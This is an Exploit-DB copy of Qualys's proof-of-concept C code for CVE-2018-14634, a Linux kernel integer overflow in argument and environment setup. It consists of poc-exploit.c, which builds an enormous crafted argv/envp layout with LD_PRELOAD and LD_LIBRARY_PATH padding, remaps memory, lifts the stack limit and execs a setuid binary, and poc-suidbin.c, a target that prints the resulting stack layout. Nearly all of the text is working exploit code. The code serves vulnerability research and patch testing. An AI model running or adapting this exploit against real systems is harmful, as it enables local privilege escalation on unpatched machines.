/*
EDB-Note: Systems with less than 32GB of RAM are unlikely to be affected by this issue, due to memory demands during exploitation.
EDB Note: poc-exploit.c
*/

/*
 * poc-exploit.c for CVE-2018-14634
 * Copyright (C) 2018 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <limits.h>
#include <paths.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define MAPCOUNT_ELF_CORE_MARGIN        (5)
#define DEFAULT_MAX_MAP_COUNT   (USHRT_MAX - MAPCOUNT_ELF_CORE_MARGIN)

#define PAGESZ ((size_t)4096)
#define MAX_ARG_STRLEN ((size_t)128 << 10)
#define MAX_ARG_STRINGS ((size_t)0x7FFFFFFF)

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

int
main(void)
{
    if (sizeof(size_t) != sizeof(uint64_t)) die();
    const size_t alpha = 512;
    const size_t sprand = 8192;
    const size_t beta = (size_t)9 << 10;
    const size_t items = (size_t)1 << 31;
    const size_t offset = items * sizeof(uintptr_t);

    #define LLP "LD_LIBRARY_PATH=."
    static char preload_env[MAX_ARG_STRLEN];
  {
    char * const sp = stpcpy(preload_env, "LD_PRELOAD=");
    char * cp = preload_env + sizeof(preload_env);
    size_t n;
    for (n = 1; n <= (size_t)(cp - sp) / sizeof(LLP); n++) {
        size_t i;
        for (i = n; i; i--) {
            *--cp = (n == 1) ? '\0' : (i == n) ? ':' : '0';
            cp -= sizeof(LLP)-1;
            memcpy(cp, LLP, sizeof(LLP)-1);
        }
    }
    memset(sp, ':', (size_t)(cp - sp));
    if (memchr(preload_env, '\0', sizeof(preload_env)) !=
                    preload_env + sizeof(preload_env)-1) die();
  }
    const char * const protect_envp[] = {
        preload_env,
    };
    const size_t protect_envc = sizeof(protect_envp) / sizeof(protect_envp[0]);
    size_t _protect_envsz = 0;
  {
    size_t i;
    for (i = 0; i < protect_envc; i++) {
        _protect_envsz += strlen(protect_envp[i]) + 1;
    }
  }
    const size_t protect_envsz = _protect_envsz;

    const size_t scratch_envsz = (size_t)1 << 20;
    const size_t scratch_envc = scratch_envsz / MAX_ARG_STRLEN;
    if (scratch_envsz % MAX_ARG_STRLEN) die();
    static char scratch_env[MAX_ARG_STRLEN];
    memset(scratch_env, ' ', sizeof(scratch_env)-1);

    const size_t onebyte_envsz = (size_t)256 << 10;
    const size_t onebyte_envc = onebyte_envsz / 1;

    const size_t padding_envsz = offset + alpha;
    /***/ size_t padding_env_rem = padding_envsz % MAX_ARG_STRLEN;
    const size_t padding_envc = padding_envsz / MAX_ARG_STRLEN + !!padding_env_rem;
    static char padding_env[MAX_ARG_STRLEN];
    memset(padding_env, ' ', sizeof(padding_env)-1);
    static char padding_env1[MAX_ARG_STRLEN];
    if (padding_env_rem) memset(padding_env1, ' ', padding_env_rem-1);

    const size_t envc = protect_envc + scratch_envc + onebyte_envc + padding_envc;
    if (envc > MAX_ARG_STRINGS) die();

    const size_t argc = items - (1 + 1 + envc + 1);
    if (argc > MAX_ARG_STRINGS) die();

    const char * const protect_argv[] = {
        "./poc-suidbin",
    };
    const size_t protect_argc = sizeof(protect_argv) / sizeof(protect_argv[0]);
    if (protect_argc >= argc) die();
    size_t _protect_argsz = 0;
  {
    size_t i;
    for (i = 0; i < protect_argc; i++) {
        _protect_argsz += strlen(protect_argv[i]) + 1;
    }
  }
    const size_t protect_argsz = _protect_argsz;

    const size_t padding_argc = argc - protect_argc;
    const size_t padding_argsz = (offset - beta) - (alpha + sprand / 2 +
                   protect_argsz + protect_envsz + scratch_envsz + onebyte_envsz / 2);
    const size_t padding_arg_len = padding_argsz / padding_argc;
    /***/ size_t padding_arg_rem = padding_argsz % padding_argc;
    if (padding_arg_len >= MAX_ARG_STRLEN) die();
    if (padding_arg_len < 1) die();
    static char padding_arg[MAX_ARG_STRLEN];
    memset(padding_arg, ' ', padding_arg_len-1);
    static char padding_arg1[MAX_ARG_STRLEN];
    memset(padding_arg1, ' ', padding_arg_len);

    const char ** const envp = calloc(envc + 1, sizeof(char *));
    if (!envp) die();
  {
    size_t envi = 0;
    size_t i;
    for (i = 0; i < protect_envc; i++) {
        envp[envi++] = protect_envp[i];
    }
    for (i = 0; i < scratch_envc; i++) {
        envp[envi++] = scratch_env;
    }
    for (i = 0; i < onebyte_envc; i++) {
        envp[envi++] = "";
    }
    for (i = 0; i < padding_envc; i++) {
        if (padding_env_rem) {
            envp[envi++] = padding_env1;
            padding_env_rem = 0;
        } else {
            envp[envi++] = padding_env;
        }
    }
    if (envi != envc) die();
    if (envp[envc] != NULL) die();
    if (padding_env_rem) die();
  }

    const size_t filemap_size = ((padding_argc - padding_arg_rem) * sizeof(char *) / (DEFAULT_MAX_MAP_COUNT / 2) + PAGESZ-1) & ~(PAGESZ-1);
    const size_t filemap_nptr = filemap_size / sizeof(char *);
    char filemap_name[] = _PATH_TMP "argv.XXXXXX";
    const int filemap_fd = mkstemp(filemap_name);
    if (filemap_fd <= -1) die();
    if (unlink(filemap_name)) die();
  {
    size_t i;
    for (i = 0; i < filemap_nptr; i++) {
        const char * const ptr = padding_arg;
        if (write(filemap_fd, &ptr, sizeof(ptr)) != (ssize_t)sizeof(ptr)) die();
    }
  }
  {
    struct stat st;
    if (fstat(filemap_fd, &st)) die();
    if ((size_t)st.st_size != filemap_size) die();
  }

    const char ** const argv = mmap(NULL, (argc + 1) * sizeof(char *), PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (argv == MAP_FAILED) die();
    if (protect_argc > PAGESZ / sizeof(char *)) die();
    if (mmap(argv, PAGESZ, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != argv) die();
  {
    size_t argi = 0;
  {
    size_t i;
    for (i = 0; i < protect_argc; i++) {
        argv[argi++] = protect_argv[i];
    }
  }
  {
    size_t n = padding_argc;
    while (n) {
        void * const argp = &argv[argi];
        if (((uintptr_t)argp & (PAGESZ-1)) == 0) {
            if (padding_arg_rem || n < filemap_nptr) {
                if (mmap(argp, PAGESZ, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != argp) die();
            } else {
                if (mmap(argp, filemap_size, PROT_READ, MAP_FIXED | MAP_PRIVATE, filemap_fd, 0) != argp) die();
                argi += filemap_nptr;
                n -= filemap_nptr;
                continue;
            }
        }
        if (padding_arg_rem) {
            argv[argi++] = padding_arg1;
            padding_arg_rem--;
        } else {
            argv[argi++] = padding_arg;
        }
        n--;
    }
  }
    if (argi != argc) die();
    if (argv[argc] != NULL) die();
    if (padding_arg_rem) die();
  }

  {
    static const struct rlimit stack_limit = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    if (setrlimit(RLIMIT_STACK, &stack_limit)) die();
  }
    execve(argv[0], (char * const *)argv, (char * const *)envp);
    die();
}

/*
EDB Note: EOF poc-exploit.c
*/




/*
EDB Note: poc-suidbin.c
*/


/*
 * poc-suidbin.c for CVE-2018-14634
 * Copyright (C) 2018 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

int
main(const int argc, const char * const * const argv, const char * const * const envp)
{
    printf("argc %d\n", argc);

    char stack = '\0';
    printf("stack %p < %p < %p < %p < %p\n", &stack, argv, envp, *argv, *envp);

    #define LLP "LD_LIBRARY_PATH"
    const char * const llp = getenv(LLP);
    printf("getenv %p %s\n", llp, llp);

    const char * const * env;
    for (env = envp; *env; env++) {
        if (!strncmp(*env, LLP, sizeof(LLP)-1)) {
            printf("%p %s\n", *env, *env);
        }
    }
    exit(EXIT_SUCCESS);
}

/*
EDB Note: EOF poc-suidbin.c
*/